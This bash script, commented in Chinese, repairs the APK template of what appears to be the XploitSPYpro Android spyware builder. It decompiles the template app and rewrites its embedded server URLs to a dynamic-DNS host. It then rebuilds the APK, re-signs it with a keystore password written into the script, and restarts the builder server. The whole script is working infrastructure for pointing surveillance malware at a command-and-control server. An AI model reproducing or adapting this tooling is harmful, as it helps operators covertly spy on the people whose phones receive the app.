#!/bin/bash
# 服务器端紧急修复脚本 - 修复 APK 模板 URL

PROJECT_DIR="/home/test2/XploitSPYpro-main202605100042/XploitSPYpro-main"
FACTORY_DIR="$PROJECT_DIR/server/app/factory"

echo "=========================================="
echo "服务器端 APK 模板修复"
echo "=========================================="

# 检查目录
if [ ! -d "$FACTORY_DIR" ]; then
    echo "错误: 工厂目录不存在: $FACTORY_DIR"
    exit 1
fi

cd "$FACTORY_DIR"

# 备份原文件
echo "备份原 APK..."
cp app-release.apk app-release.apk.backup.$(date +%Y%m%d%H%M%S)

# 创建临时工作目录
mkdir -p temp_fix
cd temp_fix

echo ""
echo "步骤1: 反编译 APK..."
java -jar ../apktool.jar d -f -o decompiled ../app-release.apk

echo ""
echo "步骤2: 查找并替换 URL..."

# 查找所有包含 localhost 的 smali 文件
FOUND_FILES=$(find decompiled/smali -name "*.smali" -exec grep -l "http://localhost:80\|http://127.0.0.1:80\|xwizer.herokuapp.com:80" {} \;)

if [ -z "$FOUND_FILES" ]; then
    echo "警告: 未找到包含旧URL的smali文件"
else
    echo "找到以下文件需要修复:"
    echo "$FOUND_FILES"
    
    # 替换 URL
    find decompiled/smali -name "*.smali" -exec sed -i 's|http://localhost:80|http://ubuntu222506test.webredirect.org:8080|g' {} \;
    find decompiled/smali -name "*.smali" -exec sed -i 's|http://127.0.0.1:80|http://ubuntu222506test.webredirect.org:8080|g' {} \;
    find decompiled/smali -name "*.smali" -exec sed -i 's|http://xwizer.herokuapp.com:80|http://ubuntu222506test.webredirect.org:8080|g' {} \;
    
    echo "✓ URL 替换完成"
fi

echo ""
echo "步骤3: 重新编译 APK..."
java -jar ../apktool.jar b decompiled -o ../app-release-new.apk

cd ..

echo ""
echo "步骤4: 签名 APK..."
java -jar uber-apk-signer-1.1.0.jar \
    -a app-release-new.apk \
    --ks release.jks --ksAlias key0 \
    --ksPass release101 --ksKeyPass release101 \
    --ksType JKS --allow-resign --overwrite \
    -o .

echo ""
echo "步骤5: 替换原 APK..."
mv app-release.apk app-release.apk.old
mv app-release-new-aligned-signed.apk app-release.apk

# 更新 decompiled 目录
echo ""
echo "步骤6: 更新 decompiled 目录..."
rm -rf decompiled
java -jar apktool.jar d -f -o decompiled app-release.apk

# 清理
rm -rf temp_fix app-release-new.apk app-release.apk.old

echo ""
echo "=========================================="
echo "修复完成!"
echo "=========================================="
echo ""
echo "验证新的 APK 模板:"
unzip -p app-release.apk classes.dex | strings | grep "http://" | head -5
echo ""
echo "请重启服务器并测试构建:"
echo "  cd $PROJECT_DIR/server"
echo "  PORT=8080 node index.js"
